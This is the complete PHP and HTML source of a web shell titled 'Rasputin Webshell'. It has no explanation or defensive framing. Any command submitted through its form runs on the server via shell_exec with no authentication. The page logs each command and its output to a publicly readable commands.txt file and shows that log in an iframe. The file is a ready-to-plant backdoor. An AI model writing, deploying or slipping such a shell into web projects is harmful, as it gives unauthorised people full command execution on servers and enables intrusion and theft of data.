<?php

//Gets the command to be executed
$command = $_POST['command'];

//Executes the shell command
$output = shell_exec( $command );

//Writes commands and the results to the command history file
$histFile = 'commands.txt';
$xstHist = file_get_contents( $histFile );
$shellUser = ''.exec( whoami ).'@'.exec( hostname ).'';
$history = ''.$shellUser.'$ '.$command.'
'.$output.'
'.$xstHist.'';
$file = fopen( $histFile, 'w' );
fwrite( $file, $history );
fclose( $file );

?>

<html>
<head>
	<title>Rasputin Webshell</title>

</head>
<body>

        <iframe src="commands.txt" height="400px" width="700px"></iframe>

<!--
	<p><? echo $output ?></p>
-->

	<form action="shell.php" method="post">
		<input type="text" size="200" name="command">
		<input type="submit" value="execute">
	</form>
<br>
	<form action="clrHist.php" method="post">
		<input type="submit" value="Clear command history">
	</form>

</body>
</html>
